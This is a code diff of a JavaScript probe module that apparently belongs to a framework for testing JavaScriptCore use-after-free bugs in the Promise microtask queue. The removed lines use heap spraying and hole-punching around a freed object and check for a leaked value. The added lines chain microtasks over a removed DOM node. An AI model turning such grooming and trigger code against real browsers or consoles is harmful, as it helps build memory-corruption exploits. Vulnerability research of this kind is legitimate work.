@@ -1,84 +1,132 @@
-import { Groomer } from '../mod_groomer.js';
+/**
+ * SC_PROMISE_MICROTASK.JS
+ * Categoria : JS ENGINE — Use-After-Free (Microtask)
+ * Alvo      : JSC Promise microtask queue / DOM access ordering
+ * Técnica   : Encadeia Promise.resolve().then() com remoção de nó DOM
+ *             intercalada. A microtask pode executar após o C++ ter
+ *             liberado o nó se o GC correr entre o resolve e o .then().
+ *             Testa também async/await sobre nó removido.
+ * Referência: WebKit microtask/GC ordering bug pattern (JSC)
+ */
 
 export default {
-    id:       'PROMISE_MICROTASK_UAF',
-    category: 'CoreJS',
-    risk:     'HIGH',
-    description:
-        'Race Condition na Fila de Microtarefas do JSC. Intercala Promises com ' +
-        'MutationObservers. Uma microtarefa destrói o contexto de execução (freed object), ' +
-        'enquanto a microtarefa seguinte na C++ queue tenta invocar um callback no objeto morto.',
+    id:          'PROMISE_MICROTASK_UAF',
+    category:    'JS ENGINE',
+    risk:        'MEDIUM',
+    description: 'Microtask Promise acessa nó DOM removido entre resolve e .then(). '
+                + 'Testa ordering entre GC e microtask queue no JSC.',
 
-    setup: function() {
-        this.results = { sequence: [] };
-        this.sandbox = document.getElementById('groomer-sandbox');
-        
-        this.dummy = document.createElement('div');
-        this.sandbox.appendChild(this.dummy);
+    /* ── estado interno ──────────────────────────────────────────────── */
+    _container:   null,
+    _target:      null,
+    _microResult: null,
+    _microPhase:  null,
+    _asyncResult: null,
+    _chainDepth:  0,
 
-        const self = this;
-        // Objeto que será destruído, mas cujo método está agendado na fila
-        this.victim = {
-            id: 0x1337,
-            callback: function() {
-                try { self.results.leak = this.id; } catch(e) {}
-            }
-        };
+    supported: function() {
+        return typeof Promise !== 'undefined';
     },
 
+    /* ── setup ──────────────────────────────────────────────────────── */
+    setup: async function() {
+        this._microResult = null;
+        this._microPhase  = null;
+        this._asyncResult = null;
+        this._chainDepth  = 0;
+
+        this._container = document.createElement('div');
+        document.body.appendChild(this._container);
+
+        this._target = document.createElement('div');
+        this._target.id = 'promise-uaf-target';
+        this._target.textContent = 'microtask-canary';
+        this._target.setAttribute('data-val', '42');
+        this._container.appendChild(this._target);
+
+        void this._target.offsetWidth;
+        await new Promise(r => setTimeout(r, 0));
+    },
+
+    /* ── trigger ─────────────────────────────────────────────────────── */
     trigger: async function() {
-        const self = this;
-        return new Promise(resolve => {
-            
-            // 1. Agendamos o callback da vítima (vai para a fila VIP C++)
-            Promise.resolve().then(() => {
-                // Como não usamos arrow function e forçamos o apply, o C++ tem de resolver o 'this'
-                self.victim.callback.apply(self.victim);
-            });
+        const el = this._target;
 
-            // 2. O GATILHO: Agendamos um MutationObserver (também fila VIP)
-            // Ele vai rodar ANTES ou DEPOIS da Promise (depende da implementação do PS4)
-            let observer = new MutationObserver(() => {
-                // Destruímos a vítima
-                self.victim = null;
-                
-                // Forçamos lixo no Heap
-                let trash = Groomer.sprayStrings(500, 1024);
-                Groomer.punchHoles(trash, 2);
-            });
-            
-            observer.observe(this.dummy, { attributes: true });
-            this.dummy.setAttribute('data-trigger', '1'); // Dispara o Observer
+        // Cadeia profunda de microtasks (Promise chain)
+        const deepChain = (n) => {
+            let p = Promise.resolve(el);
+            for (let i = 0; i < n; i++) {
+                p = p.then(node => {
+                    this._chainDepth++;
+                    // Tenta ler o nó em cada microtask
+                    try {
+                        return { node, val: node.getAttribute('data-val'), conn: node.isConnected };
+                    } catch(e) {
+                        return { node: null, err: e.constructor.name };
+                    }
+                });
+            }
+            return p;
+        };
 
-            // Damos tempo para as microtarefas colidirem e saímos
-            setTimeout(() => {
-                observer.disconnect();
-                resolve();
-            }, 10);
-        });
+        // Inicia a cadeia e remove o elemento ANTES que ela termine
+        const chain = deepChain(20);
+        el.remove(); // libera do DOM enquanto as microtasks estão na fila
+
+        try {
+            const result = await chain;
+            this._microResult = result?.val ?? String(result?.err);
+            this._microPhase  = result?.conn ? 'connected' : 'disconnected';
+        } catch(e) {
+            this._microResult = `ERROR:${e.constructor.name}`;
+        }
+
+        // Teste async/await
+        const asyncRead = async (node) => {
+            await Promise.resolve();
+            return node.textContent;
+        };
+
+        try {
+            this._asyncResult = await asyncRead(el);
+        } catch(e) {
+            this._asyncResult = `ERROR:${e.constructor.name}`;
+        }
+
+        await new Promise(r => setTimeout(r, 10));
     },
 
+    /* ── probes ──────────────────────────────────────────────────────── */
     probe: [
-        // Probe 0: O motor crascha ou segue em frente?
-        s => s.results.leak ? 'Microtarefas Drenadas' : 'Conflito ou Protegido',
-        
-        // Probe 1: Acesso a memória freed
-        s => {
-            let val = s.results.leak;
-            // Se o callback correu DEPOIS de victim = null, this.id devia ser indefinido/crash.
-            // Se leu 0x1337 (4919), correu antes.
-            // Se leu lixo gigante, temos UAF na fila de microtarefas!
-            if (typeof val === 'number' && val !== 0x1337 && val > 10000) {
-                return val; // Aciona o HUD Vermelho
-            }
-            return 0; // Seguro
-        }
+        // [0-3] estado do nó após remoção
+        s => s._target.isConnected,
+        s => s._target.textContent,
+        s => s._target.getAttribute('data-val'),
+        s => s._target.nodeType,
+
+        // [4-7] resultado das microtasks
+        s => s._microResult,
+        s => s._microPhase,
+        s => s._chainDepth,
+        s => typeof s._microResult,
+
+        // [8-9] resultado async/await
+        s => s._asyncResult,
+        s => typeof s._asyncResult,
+
+        // [10] container intacto
+        s => s._container.isConnected,
+        s => s._container.contains(s._target),
     ],
 
-    cleanup: function() {
-        try { this.dummy.remove(); } catch(e){}
-        this.victim = null;
-        this.dummy = null;
-        this.results = {};
+    /* ── cleanup ─────────────────────────────────────────────────────── */
+    cleanup: async function() {
+        this._container?.remove();
+        this._container  = null;
+        this._target     = null;
+        this._microResult = null;
+        this._microPhase  = null;
+        this._asyncResult = null;
+        this._chainDepth  = 0;
     }
 };
